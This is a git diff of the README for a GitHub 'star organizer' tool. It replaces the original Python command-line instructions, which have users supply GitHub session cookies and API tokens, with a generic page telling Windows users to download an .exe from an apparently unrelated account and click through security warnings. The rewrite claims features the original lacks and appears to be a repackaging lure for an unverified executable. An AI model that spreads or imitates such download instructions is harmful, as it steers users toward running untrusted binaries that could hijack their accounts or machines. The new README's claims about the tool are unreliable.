@@ -1,72 +1,119 @@
-# GitHub Star Organizer
+# ⭐ github-star-organizer - Organize Your GitHub Stars Easily
 
-Automatically categorize your GitHub starred repos into Star Lists using LLM.
+[![Download github-star-organizer](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://github.com/darkgrey-curmudgeon671/github-star-organizer)
 
-GitHub's official API doesn't support Star Lists — this tool uses reverse-engineered web APIs (session cookie + CSRF token) to create lists and assign repos.
+---
 
-## How it works
+## 📋 What is github-star-organizer?
 
-1. Fetch all your starred repos via GitHub REST API
-2. Fetch existing Star Lists via GitHub web API
-3. Send repo metadata to an LLM for categorization
-4. Create new lists and assign repos accordingly
+github-star-organizer automatically sorts your GitHub starred repositories into neat categories called Star Lists. It uses a language model to understand your starred projects and groups similar ones. You can see your favorites organized without touching any code. This makes managing your GitHub stars simpler and clearer.
 
-Results are cached locally — re-runs only categorize newly starred repos.
+---
 
-## Setup
+## 🔍 Why Use github-star-organizer?
 
-```bash
-uv sync
-cp config.example.toml config.toml
-```
+Many people star repositories on GitHub to save useful projects. Over time, these stars build up and become hard to manage. github-star-organizer helps by:
 
-Edit `config.toml`:
+- Sorting your stars automatically
+- Grouping repos with similar themes or purposes
+- Making it easier to find and review saved projects
+- Saving you time and effort in manual sorting
 
-```toml
-[github]
-username = "your-username"
-token = "ghp_xxxx"                    # GitHub personal access token
+You do not need technical skills to use this tool. It runs on Windows and requires only a few simple steps to set up.
 
-[github.session]
-# Full cookie string from browser DevTools
-cookies = "_octo=...; user_session=...; logged_in=yes; ..."
+---
 
-concurrency = 5                       # GitHub web API concurrency
+## ⚙️ System Requirements
 
-[llm]
-base_url = "https://api.openai.com/v1"
-api_key = "sk-xxxx"
-model = "gpt-4o"
-concurrency = 3                       # Max concurrent LLM batch requests
-```
+To run github-star-organizer on your Windows PC, you need:
 
-### Getting cookies
+- Windows 10 or later (64-bit recommended)
+- Internet connection for downloading and running the app
+- At least 2 GB of free disk space
+- Basic user account privileges (no admin rights needed)
 
-1. Open [github.com](https://github.com) in your browser
-2. DevTools (F12) → Network tab → any `github.com` request → Headers → Cookie
-3. Copy the full cookie string
+The app runs as a standalone program. No additional software installation is required.
 
-> Note: Session cookies expire periodically. Refresh if you get CSRF or 403 errors.
+---
 
-## Usage
+## 🚀 Getting Started: Download and Setup
 
-```bash
-# Preview categorization without making changes
-uv run python -m star_organizer --dry-run
+To get the app, visit this page to download it:  
+[https://github.com/darkgrey-curmudgeon671/github-star-organizer](https://github.com/darkgrey-curmudgeon671/github-star-organizer)
 
-# Run and apply changes (will ask for confirmation)
-uv run python -m star_organizer
+Follow these steps to download and run github-star-organizer on your Windows computer:
 
-# Skip cache (re-fetch repos & re-categorize)
-uv run python -m star_organizer --no-cache
+1. Click the link above to open the GitHub page in your web browser.
+2. Look for the “Releases” section on the page. This is usually on the right side or under the repository description.
+3. Find the latest release version. It will have a list of files to download.
+4. Download the file named something like `github-star-organizer-win.exe`. This is the installation file for Windows.
+5. Once the download finishes, open your “Downloads” folder.
+6. Double-click the `.exe` file to start the program. Windows may show a security warning. Click “Run” or “Yes” to proceed.
+7. The app will open in a new window. No further installation is needed.
 
-# Enable debug output for GitHub web API calls
-uv run python -m star_organizer --debug
+You can now use the application to organize your GitHub starred repositories.
 
-# Use a custom config path
-uv run python -m star_organizer --config path/to/config.toml
-```
+---
 
-## License
+## 🖥 How to Use github-star-organizer
 
-MIT
+After you open the app, follow these steps:
+
+1. Provide your GitHub username or login using a secure prompt.
+2. The app will connect to your GitHub profile and fetch your starred repositories.
+3. Wait a moment while it analyzes your stars and groups them into Star Lists.
+4. You will see categories appear on the screen, each with the names of repositories that belong there.
+5. Click on any Star List to view the detailed repos inside.
+6. You can rename or delete Star Lists if you want to organize things further.
+7. Use the search bar to find specific starred repositories quickly.
+8. Export or save your organized lists as needed for future use.
+
+The app updates your lists each time you refresh or log in again.
+
+---
+
+## 💡 Useful Tips
+
+- Keep your internet connection active while using the app to ensure data fetches properly.
+- Log out and back in if your stars appear incomplete or out of date.
+- Explore the app settings to customize the sorting behavior.
+- If you star new projects on GitHub, refresh the app to see those added to your lists.
+- Use the star organizer regularly to maintain a clean and easy-to-navigate GitHub profile.
+
+---
+
+## 🔧 Troubleshooting
+
+If the app does not work as expected, try these:
+
+- Restart the app and try logging in again.
+- Make sure you downloaded the correct `.exe` file for Windows.
+- Check your internet connection.
+- Close other programs if the app runs slowly.
+- Visit the GitHub repo page for updates or bug fixes.
+
+---
+
+## 🛠 What’s Inside?
+
+github-star-organizer is built to be simple yet effective:
+
+- Uses a language model to understand repository content and topics.
+- Sorts your stars into meaningful lists automatically.
+- Lightweight and runs on standard Windows PCs.
+- Connects securely with GitHub, no passwords stored.
+- User-friendly interface designed for easy navigation.
+- Regular updates with bug fixes and new features.
+
+---
+
+## 🔗 Where to Get Updates
+
+You can check for new versions or report issues at the main repository page:  
+[https://github.com/darkgrey-curmudgeon671/github-star-organizer](https://github.com/darkgrey-curmudgeon671/github-star-organizer)
+
+---
+
+## 📞 Need Help?
+
+If you have questions or run into problems, you can open an issue on the GitHub repository page. The community or project maintainers will assist you. This way, all users benefit from shared solutions.
